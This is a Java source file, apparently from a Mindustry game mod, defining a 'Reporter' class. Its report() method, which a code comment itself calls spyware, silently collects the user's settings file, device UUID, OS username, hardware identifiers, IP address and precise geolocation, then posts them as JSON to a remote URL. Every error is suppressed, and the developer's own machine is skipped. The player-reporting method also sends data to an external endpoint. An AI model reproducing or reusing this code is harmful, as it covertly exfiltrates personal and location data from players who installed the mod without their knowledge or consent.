package Photon.Information;

import Atom.Manifest;
import Atom.Nitrogen.Info;
import Photon.gae;
import arc.Core;
import arc.Net.HttpMethod;
import arc.Net.HttpRequest;
import arc.Net.HttpResponse;
import arc.func.Cons;
import arc.util.NetJavaImpl;
import arc.util.OS;
import arc.util.serialization.JsonValue;
import arc.util.serialization.JsonValue.ValueType;
import arc.util.serialization.JsonWriter.OutputType;
import mindustry.Vars;
import mindustry.core.Version;
import mindustry.entities.type.Player;

import static Atom.Manifest.*;
import static mindustry.Vars.*;


public class Reporter{

    private final Info info = new Info("Reporter");


    public Reporter(){
    }

    public void sendChat(String chat){
        httpPost(MD_CHAT, chat);
    }

    public void sendHelp(String help){

    }

    public void httpPost(String url, String content){
        httpPost(url, content, a ->{} , a ->{} );
    }

    public void httpPost(String url, String content, Cons<HttpResponse> success, Cons<Throwable> failure){
        new NetJavaImpl().http(new HttpRequest().method(HttpMethod.POST).content(content).url(url), success, failure);
    }

    public int hashPlayer(Player p){
        int hash = 8523253;
        return hash * gae.obfuscate.hashString(p.name, p.id, hash);
    }

    public boolean isPlayerSame(Player p, Player p2){
        return hashPlayer(p) == hashPlayer(p2);
    }

    public boolean isPlayerReported(Player p){
        int Hash = Core.settings.getInt(p.name, 0);
        return hashPlayer(p) == Hash;
    }

    public void addTargetPlayer(Player p){
        platform.getSysInfo();
        StringBuilder sb = new StringBuilder();
          sb.append("```java");
          sb.append("\n");
          sb.append(gae.hydrogen.capitalizeFirstLetter(username)).append(" Report:");
          sb.append("\n");
          sb.append("Server: ").append("'").append(currentServer).append("'");
          sb.append("\n");
          sb.append("\n");
          sb.append("'Reporter Name' :    ").append("'").append(player.name).append("'");
          sb.append("\n");
          sb.append("'Reported Name' :    ").append("'").append(p.name).append("'");
          sb.append("\n");
          sb.append("'Reported ID'   :     ").append(p.id);
          sb.append("\n");
          sb.append("'Reported Hash' :     ").append(hashPlayer(p));
          sb.append("\n");
          sb.append("'Reported Data' :    ");
          sb.append("\n");
          sb.append("\n");
          sb.append(p.toString());
          sb.append("\n");
          sb.append("```");
          Core.settings.put(p.name, hashPlayer(p));
          Core.settings.save();
          httpPost(Manifest.crashReportURL  + username + "/Reporting", sb.toString(), r -> { }, t -> { });



    }

    public void ex(Runnable r){
        try{
            r.run();
        }catch(Throwable ignored){
        }
    }

    //Careful bylat, this is spyware
    public void report(String status) {
        if(System.getProperty("user.name").equals("Itz"))
            return;
        try {
            platform.getSysInfo();
            info.SatisfyInfo();

            JsonValue value = new JsonValue(ValueType.object);

            ex(() -> value.addChild("Mindustry Info", new JsonValue("----------------------------Mindustry Info------------------------------------")));
            ex(() -> value.addChild("PlayerName", new JsonValue(player.name)));
            ex(() -> value.addChild("CurrentServer", new JsonValue(ServerNow)));
            ex(() -> value.addChild("SettingsFile", new JsonValue(Core.settings.getSettingsFile().readString())));
            ex(() -> value.addChild("Mods", new JsonValue(ModsNow)));
            ex(() -> value.addChild("UUID", new JsonValue(platform.getUUID())));
            ex(() -> value.addChild("USID", new JsonValue(USID)));
            ex(() -> value.addChild("VersionType", new JsonValue(Version.type)));
            ex(() -> value.addChild("VersionNumber", new JsonValue(Version.number)));
            ex(() -> value.addChild("VersionModifier", new JsonValue(Version.modifier)));
            ex(() -> value.addChild("Build", new JsonValue(Version.build)));
            ex(() -> value.addChild("Revision", new JsonValue(Version.revision)));
            ex(() -> value.addChild("Players Count", new JsonValue(Vars.playerGroup.size())));
            ex(() -> value.addChild("GameState", new JsonValue(Vars.state.getState().name())));
            ex(() -> value.addChild("Status", new JsonValue(StatusNow)));
            ex(() -> value.addChild("Hardware Info", new JsonValue("------------------------Hardware Info----------------------------------------")));
            ex(() -> value.addChild("Env", new JsonValue(ENV)));
            if (!android) {
                ex(() -> value.addChild("Username", new JsonValue(username)));
                ex(() -> value.addChild("Core", new JsonValue(Cores)));
                ex(() -> value.addChild("FreeMemory", new JsonValue(FreeMemory)));
                ex(() -> value.addChild("MaxMemory", new JsonValue(MaxMemory)));
                ex(() -> value.addChild("Root", new JsonValue(Roots)));
                ex(() -> value.addChild("TotalSpace", new JsonValue(TotalSpace)));
                ex(() -> value.addChild("FreeSpace", new JsonValue(FreeSpace)));
                ex(() -> value.addChild("UsableSpace", new JsonValue(UsableSpace)));
                ex(() -> value.addChild("OS", new JsonValue(System.getProperty("os.name") + " x" + (OS.is64Bit ? "64" : "32"))));
                ex(() -> value.addChild("JavaVersion", new JsonValue(System.getProperty("java.version"))));
                ex(() -> value.addChild("JavaArch", new JsonValue(System.getProperty("sun.arch.data.model"))));
            } else {
                ex(() -> value.addChild("OS", new JsonValue(AndroidVersion)));
                ex(() -> value.addChild("ID", new JsonValue(ID)));
                ex(() -> value.addChild("DISPLAY", new JsonValue(DISPLAY)));
                ex(() -> value.addChild("PRODUCT", new JsonValue(PRODUCT)));
                ex(() -> value.addChild("DEVICE", new JsonValue(DEVICE)));
                ex(() -> value.addChild("BOARD", new JsonValue(BOARD)));
                ex(() -> value.addChild("MANUFACTURER", new JsonValue(MANUFACTURER)));
                ex(() -> value.addChild("BRAND", new JsonValue(BRAND)));
                ex(() -> value.addChild("MODEL", new JsonValue(MODEL)));
                ex(() -> value.addChild("BOOTLOADER", new JsonValue(BOOTLOADER)));
                ex(() -> value.addChild("HARDWARE", new JsonValue(HARDWARE)));
            }
            ex(() -> value.addChild("Provider Info", new JsonValue("---------------------------------Provider Info-------------------------------")));
            ex(() -> { try { value.addChild("Ip", new JsonValue(gae.net.getProvider())); } catch (Exception ignored) { } });
            ex(() -> value.addChild("Continent", new JsonValue(Continent)));
            ex(() -> value.addChild("ContinentCode", new JsonValue(ContinentCode)));
            ex(() -> value.addChild("Country", new JsonValue(Country)));
            ex(() -> value.addChild("CountryCode", new JsonValue(CountryCode)));
            ex(() -> value.addChild("Region", new JsonValue(Region)));
            ex(() -> value.addChild("RegionName", new JsonValue(RegionName)));
            ex(() -> value.addChild("City", new JsonValue(City)));
            ex(() -> value.addChild("District", new JsonValue(District)));
            ex(() -> value.addChild("Zip", new JsonValue(Zip)));
            ex(() -> value.addChild("Latitude", new JsonValue(Latidude)));
            ex(() -> value.addChild("Longitude", new JsonValue(Longtidude)));
            ex(() -> value.addChild("TimeZone", new JsonValue(TimeZone)));
            ex(() -> value.addChild("Currency", new JsonValue(Currency)));
            ex(() -> value.addChild("ISP", new JsonValue(ISP)));
            ex(() -> value.addChild("ORG", new JsonValue(ORG)));
            ex(() -> value.addChild("AS", new JsonValue(AS)));
            ex(() -> value.addChild("ASName", new JsonValue(ASName)));
            ex(() -> value.addChild("reverse", new JsonValue(reverse)));
            ex(() -> value.addChild("deviceMobile", new JsonValue(deviceMobile)));
            ex(() -> value.addChild("proxy", new JsonValue(proxy)));
            ex(() -> value.addChild("Hosting", new JsonValue(hosting)));
            ex(() -> value.addChild("Date", new JsonValue(gae.timeKeeper.getDates(false))));
            ex(() -> value.addChild("Time", new JsonValue(gae.timeKeeper.getDates(true))));

            ex(() -> value.addChild("Notes", new JsonValue("Report System 2.0")));
            String url = "127.0.0.1" + status + "/" + username;
            String jsons = value.toJson(OutputType.json);
            httpPost(url, jsons, r -> { }, t -> { });

        } catch (Throwable ignored) { }

    }

}
